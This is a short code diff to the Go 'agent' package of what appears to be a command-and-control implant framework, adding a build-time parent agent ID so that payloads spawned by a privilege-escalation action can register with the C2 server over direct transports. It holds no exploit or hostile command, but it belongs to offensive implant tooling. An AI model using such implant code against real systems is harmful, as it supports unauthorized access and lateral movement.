@@ -4,6 +4,11 @@ package agent
 // inject parent_id when registering child agents (SMB pipe, HTTP pivot).
 var GlobalAgentID string
 
+// ParentAgentID is embedded in a payload created by a privesc action. A new
+// process has no runtime GlobalAgentID yet, so direct transports use this
+// build-time value when registering with the C2.
+var ParentAgentID = ""
+
 var (
 	ServerURL  = "http://127.0.0.1:8080"
 	Transport  = "http"
